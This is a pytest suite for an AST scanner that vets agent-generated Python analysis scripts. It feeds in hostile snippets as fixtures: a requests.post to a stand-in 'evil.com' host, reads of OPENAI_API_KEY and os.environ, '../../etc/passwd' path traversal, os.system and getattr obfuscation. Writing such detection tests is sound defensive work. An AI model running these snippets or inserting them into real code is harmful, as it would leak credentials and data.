"""
Tests for workers/ai_agent/tools/ast_scanner_tool.py
"""
import pytest
from workers.ai_agent.tools.ast_scanner_tool import ASTSecurityScanner


class TestASTSecurityScanner:
    @pytest.fixture
    def scanner(self):
        return ASTSecurityScanner()

    def test_safe_analysis_script(self, scanner):
        """Standard pandas analysis script passes all checks."""
        code = '''
from generated.models import create_dataset
import pandas as pd

def main():
    dataset = create_dataset()
    print(f"Loaded {len(dataset)} records")
    for record in dataset:
        print(record.patient.age)
    return {"result": "done"}

if __name__ == "__main__":
    main()
'''
        report = scanner._run(code, "main.py")
        assert report.safe is True
        assert len(report.findings) == 0
        assert "generated.models" in report.safe_imports_found
        assert "pandas" in report.safe_imports_found
        assert report.has_network_access is False
        assert report.has_code_injection is False

    def test_blocked_import_socket(self, scanner):
        """Socket import is detected as critical."""
        code = "import socket\ns = socket.socket()"
        report = scanner._run(code)
        assert report.safe is False
        assert "socket" in report.blocked_imports_found
        assert report.has_network_access is True
        assert any(f["severity"] == "critical" for f in report.findings)

    def test_blocked_import_requests(self, scanner):
        """Requests import is detected as critical."""
        code = "import requests\nrequests.post('http://evil.com', data='x')"
        report = scanner._run(code)
        assert report.safe is False
        assert "requests" in report.blocked_imports_found

    def test_blocked_import_subprocess(self, scanner):
        """Subprocess import is detected as critical."""
        code = "import subprocess\nsubprocess.run(['ls'])"
        report = scanner._run(code)
        assert report.safe is False
        assert "subprocess" in report.blocked_imports_found

    def test_blocked_import_pickle(self, scanner):
        """Pickle import is detected as high."""
        code = "import pickle\npickle.loads(b'data')"
        report = scanner._run(code)
        assert report.safe is False
        assert "pickle" in report.blocked_imports_found
        assert any(f["severity"] == "high" for f in report.findings)

    def test_dangerous_call_eval(self, scanner):
        """eval() is detected as critical."""
        code = "x = eval('1+1')"
        report = scanner._run(code)
        assert report.safe is False
        assert report.has_code_injection is True
        assert any(f["category"] == "dangerous_call" for f in report.findings)

    def test_dangerous_call_exec(self, scanner):
        """exec() is detected as critical."""
        code = "exec('import os')"
        report = scanner._run(code)
        assert report.safe is False
        assert any("exec" in f["detail"] for f in report.findings)

    def test_dangerous_call_os_system(self, scanner):
        """os.system() is detected as critical."""
        code = "import os\nos.system('whoami')"
        report = scanner._run(code)
        assert report.safe is False
        assert any(f["category"] == "dangerous_call" for f in report.findings)

    def test_credential_access_os_environ(self, scanner):
        """os.environ access is detected."""
        code = "import os\nfor k,v in os.environ.items(): print(k,v)"
        report = scanner._run(code)
        assert report.safe is False
        assert report.has_credential_access is True

    def test_credential_access_sensitive_var(self, scanner):
        """Accessing specific sensitive env vars is critical."""
        code = "import os\nkey = os.getenv('OPENAI_API_KEY')"
        report = scanner._run(code)
        assert report.safe is False
        assert any(f["severity"] == "critical" and "OPENAI_API_KEY" in f["detail"] for f in report.findings)

    def test_path_traversal_string(self, scanner):
        """Path traversal in string literals is detected."""
        code = "f = open('../../etc/passwd')"
        report = scanner._run(code)
        assert report.safe is False
        assert any(f["category"] == "path_traversal" for f in report.findings)

    def test_obfuscation_getattr(self, scanner):
        """getattr(os, 'system') obfuscation pattern is detected."""
        code = "import os\ngetattr(os, 'system')('whoami')"
        report = scanner._run(code)
        assert report.safe is False
        assert any(f["category"] == "obfuscation" for f in report.findings)

    def test_epsilon_sdk_always_safe(self, scanner):
        """Epsilon SDK generated.models is always classified as safe."""
        code = "from generated.models import create_dataset\nds = create_dataset()"
        report = scanner._run(code)
        assert report.safe is True
        assert "generated.models" in report.safe_imports_found
        assert len(report.blocked_imports_found) == 0

    def test_empty_script(self, scanner):
        """Empty script is safe."""
        report = scanner._run("", "empty.py")
        assert report.safe is True

    def test_syntax_error(self, scanner):
        """Script with syntax error is flagged."""
        report = scanner._run("def broken(:\n  pass")
        assert report.safe is False
        assert any(f["category"] == "syntax_error" for f in report.findings)

    def test_safe_os_path_usage(self, scanner):
        """os.path usage is safe (not blocked)."""
        code = "import os\npath = os.path.join('a', 'b')"
        report = scanner._run(code)
        # os import is safe, os.path.join is not a dangerous call
        assert "os" in report.safe_imports_found

    def test_base64_encoding(self, scanner):
        """base64 encode/decode is flagged as obfuscation."""
        code = "import base64\nbase64.b64encode(b'data')"
        report = scanner._run(code)
        assert report.safe is False
        assert report.has_obfuscation is True

    def test_url_in_code(self, scanner):
        """URLs in code are flagged (except schema URLs)."""
        code = "url = 'https://evil.com/exfil'"
        report = scanner._run(code)
        assert report.safe is False
        assert any(f["category"] == "obfuscation" and "URL" in f["detail"] for f in report.findings)

    def test_schema_url_not_flagged(self, scanner):
        """JSON schema URLs are not flagged."""
        code = "schema = 'https://json-schema.org/draft/2020-12/schema#'"
        report = scanner._run(code)
        assert report.safe is True
